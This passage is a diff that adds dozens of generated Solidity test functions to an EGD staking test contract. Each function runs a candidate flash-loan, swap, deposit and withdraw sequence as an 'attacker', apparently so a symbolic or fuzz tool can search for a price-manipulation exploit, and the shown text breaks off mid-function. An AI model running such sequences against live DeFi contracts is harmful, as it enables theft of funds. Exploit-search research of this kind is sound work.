@@ -376,6 +376,1278 @@ contract EGDTest is Test, BlockLoader {
         vm.stopPrank();
     }
 
+    function check_cand008(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        vm.assume(amt4 >= amt2);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        borrow_egd_pair(amt2);
+        withdraw_egdstaking_egdslp_egd(amt3);
+        payback_egd_pair(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand009(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        swap_pair_attacker_egd_usdt(amt2, amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand010(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        swap_pair_attacker_usdt_egd(amt2, amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand011(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        withdraw_egdstaking_egdslp_egd(amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        swap_pair_attacker_egd_usdt(amt4, amt5);
+        payback_usdt_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand012(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        payback_egd_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand013(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_egd_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        swap_pair_attacker_egd_usdt(amt2, amt3);
+        deposit_egdstaking_usdt_egdslp(amt4);
+        withdraw_egdstaking_egdslp_egd(amt5);
+        payback_egd_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand014(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        vm.assume(amt6 >= amt4);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        borrow_usdt_pair(amt4);
+        withdraw_egdstaking_egdslp_egd(amt5);
+        payback_usdt_pair(amt6);
+        payback_egd_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand015(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        vm.assume(amt6 >= amt4);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        borrow_egd_pair(amt4);
+        withdraw_egdstaking_egdslp_egd(amt5);
+        payback_egd_pair(amt6);
+        payback_egd_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand016(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        swap_pair_attacker_egd_usdt(amt4, amt5);
+        withdraw_egdstaking_egdslp_egd(amt6);
+        payback_egd_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand017(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        swap_pair_attacker_usdt_egd(amt4, amt5);
+        withdraw_egdstaking_egdslp_egd(amt6);
+        payback_egd_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand018(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_usdt_egd(amt5, amt6);
+        payback_egd_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand019(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_egd(amt1, amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        swap_pair_attacker_usdt_egd(amt5, amt6);
+        swap_pair_attacker_egd_usdt(amt7, amt8);
+        payback_usdt_owner(amt9);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand020(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        swap_pair_attacker_usdt_egd(amt2, amt3);
+        swap_pair_attacker_egd_usdt(amt4, amt5);
+        swap_pair_attacker_usdt_egd(amt6, amt7);
+        swap_pair_attacker_egd_usdt(amt8, amt9);
+        payback_usdt_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand021(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_egd(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        swap_pair_attacker_egd_usdt(amt4, amt5);
+        swap_pair_attacker_usdt_egd(amt6, amt7);
+        swap_pair_attacker_egd_usdt(amt8, amt9);
+        payback_usdt_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand022(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_egd(amt1, amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        swap_pair_attacker_usdt_egd(amt6, amt7);
+        swap_pair_attacker_egd_usdt(amt8, amt9);
+        payback_usdt_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand023(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_egd(amt1, amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        swap_pair_attacker_usdt_egd(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        swap_pair_attacker_egd_usdt(amt8, amt9);
+        payback_usdt_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand024(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        swap_pair_attacker_usdt_egd(amt3, amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        swap_pair_attacker_usdt_egd(amt7, amt8);
+        payback_egd_owner(amt9);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand025(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_egd_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        swap_pair_attacker_egd_usdt(amt2, amt3);
+        swap_pair_attacker_usdt_egd(amt4, amt5);
+        swap_pair_attacker_egd_usdt(amt6, amt7);
+        swap_pair_attacker_usdt_egd(amt8, amt9);
+        payback_egd_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand026(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        swap_pair_attacker_usdt_egd(amt4, amt5);
+        swap_pair_attacker_egd_usdt(amt6, amt7);
+        swap_pair_attacker_usdt_egd(amt8, amt9);
+        payback_egd_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand027(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        swap_pair_attacker_usdt_egd(amt3, amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        swap_pair_attacker_egd_usdt(amt6, amt7);
+        swap_pair_attacker_usdt_egd(amt8, amt9);
+        payback_egd_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand028(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        swap_pair_attacker_usdt_egd(amt3, amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        swap_pair_attacker_usdt_egd(amt8, amt9);
+        payback_egd_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand029(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_egd(amt1, amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        withdraw_egdstaking_egdslp_egd(amt6);
+        swap_pair_attacker_egd_usdt(amt7, amt8);
+        payback_usdt_owner(amt9);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand030(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        withdraw_egdstaking_egdslp_egd(amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        swap_pair_attacker_usdt_egd(amt5, amt6);
+        swap_pair_attacker_egd_usdt(amt7, amt8);
+        payback_usdt_owner(amt9);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand031(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        swap_pair_attacker_usdt_egd(amt3, amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        withdraw_egdstaking_egdslp_egd(amt8);
+        payback_egd_owner(amt9);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand032(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        swap_pair_attacker_usdt_egd(amt7, amt8);
+        payback_egd_owner(amt9);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand033(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        withdraw_egdstaking_egdslp_egd(amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        withdraw_egdstaking_egdslp_egd(amt6);
+        swap_pair_attacker_egd_usdt(amt7, amt8);
+        payback_usdt_owner(amt9);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand034(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        vm.assume(amt4 >= amt2);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        borrow_usdt_pair(amt2);
+        withdraw_egdstaking_egdslp_egd(amt3);
+        payback_usdt_pair(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        withdraw_egdstaking_egdslp_egd(amt8);
+        swap_pair_attacker_egd_usdt(amt9, amt10);
+        payback_usdt_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand035(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        vm.assume(amt4 >= amt2);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        borrow_egd_pair(amt2);
+        withdraw_egdstaking_egdslp_egd(amt3);
+        payback_egd_pair(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        withdraw_egdstaking_egdslp_egd(amt8);
+        swap_pair_attacker_egd_usdt(amt9, amt10);
+        payback_usdt_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand036(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        swap_pair_attacker_egd_usdt(amt2, amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        withdraw_egdstaking_egdslp_egd(amt8);
+        swap_pair_attacker_egd_usdt(amt9, amt10);
+        payback_usdt_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand037(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        swap_pair_attacker_usdt_egd(amt2, amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        withdraw_egdstaking_egdslp_egd(amt8);
+        swap_pair_attacker_egd_usdt(amt9, amt10);
+        payback_usdt_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand038(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        withdraw_egdstaking_egdslp_egd(amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        swap_pair_attacker_egd_usdt(amt4, amt5);
+        deposit_egdstaking_usdt_egdslp(amt6);
+        withdraw_egdstaking_egdslp_egd(amt7);
+        swap_pair_attacker_egd_usdt(amt8, amt9);
+        payback_usdt_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand039(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        vm.assume(amt8 >= amt6);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        withdraw_egdstaking_egdslp_egd(amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        borrow_usdt_pair(amt6);
+        withdraw_egdstaking_egdslp_egd(amt7);
+        payback_usdt_pair(amt8);
+        swap_pair_attacker_egd_usdt(amt9, amt10);
+        payback_usdt_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand040(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        vm.assume(amt8 >= amt6);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        withdraw_egdstaking_egdslp_egd(amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        borrow_egd_pair(amt6);
+        withdraw_egdstaking_egdslp_egd(amt7);
+        payback_egd_pair(amt8);
+        swap_pair_attacker_egd_usdt(amt9, amt10);
+        payback_usdt_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand041(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        withdraw_egdstaking_egdslp_egd(amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        swap_pair_attacker_egd_usdt(amt6, amt7);
+        withdraw_egdstaking_egdslp_egd(amt8);
+        swap_pair_attacker_egd_usdt(amt9, amt10);
+        payback_usdt_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand042(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        withdraw_egdstaking_egdslp_egd(amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        swap_pair_attacker_usdt_egd(amt6, amt7);
+        withdraw_egdstaking_egdslp_egd(amt8);
+        swap_pair_attacker_egd_usdt(amt9, amt10);
+        payback_usdt_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand043(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_usdt_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        withdraw_egdstaking_egdslp_egd(amt2);
+        swap_pair_attacker_egd_usdt(amt3, amt4);
+        deposit_egdstaking_usdt_egdslp(amt5);
+        withdraw_egdstaking_egdslp_egd(amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        swap_pair_attacker_egd_usdt(amt8, amt9);
+        payback_usdt_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand044(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        withdraw_egdstaking_egdslp_egd(amt4);
+        swap_pair_attacker_egd_usdt(amt5, amt6);
+        deposit_egdstaking_usdt_egdslp(amt7);
+        withdraw_egdstaking_egdslp_egd(amt8);
+        payback_egd_owner(amt9);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand045(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_egd_owner(amt0);
+        deposit_egdstaking_usdt_egdslp(amt1);
+        swap_pair_attacker_egd_usdt(amt2, amt3);
+        deposit_egdstaking_usdt_egdslp(amt4);
+        withdraw_egdstaking_egdslp_egd(amt5);
+        swap_pair_attacker_egd_usdt(amt6, amt7);
+        deposit_egdstaking_usdt_egdslp(amt8);
+        withdraw_egdstaking_egdslp_egd(amt9);
+        payback_egd_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand046(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        vm.assume(amt6 >= amt4);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        borrow_usdt_pair(amt4);
+        withdraw_egdstaking_egdslp_egd(amt5);
+        payback_usdt_pair(amt6);
+        swap_pair_attacker_egd_usdt(amt7, amt8);
+        deposit_egdstaking_usdt_egdslp(amt9);
+        withdraw_egdstaking_egdslp_egd(amt10);
+        payback_egd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand047(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        vm.assume(amt6 >= amt4);
+        borrow_egd_owner(amt0);
+        swap_pair_attacker_egd_usdt(amt1, amt2);
+        deposit_egdstaking_usdt_egdslp(amt3);
+        borrow_egd_pair(amt4);
+        withdraw_egdstaking_egdslp_egd(amt5);
+        payback_egd_pair(amt6);
